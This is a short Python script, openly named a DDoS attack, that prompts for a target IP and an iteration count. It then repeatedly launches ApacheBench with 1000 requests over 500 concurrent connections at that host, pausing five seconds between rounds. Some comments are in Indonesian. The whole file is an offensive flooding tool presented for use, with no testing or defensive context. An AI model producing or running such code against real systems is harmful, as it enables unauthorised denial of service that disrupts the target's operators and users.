import subprocess
import time

def perform_ddos_attack(ip, attack_count):
    print(f"Starting DDoS attack on {ip} with {attack_count} attack iterations...\n")

    for i in range(attack_count):
        command = [
            "ab",
            "-n", "1000",  # Total requests dalam satu iterasi
            "-c", "500",   # 500 koneksi simultan
            f"http://{ip}/"
        ]
        try:
            print(f"Executing DDoS attack #{i + 1} on {ip}...")
            subprocess.run(command, check=True)
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Attack failed on iteration #{i + 1}: {e}")

        time.sleep(5)  # Delay antar serangan

    print("\nDDoS attack completed.")

if __name__ == "__main__":
    ip_address = input("Enter the target IP address: ")
    attack_count = int(input("Enter the number of attack iterations: "))

    perform_ddos_attack(ip_address, attack_count)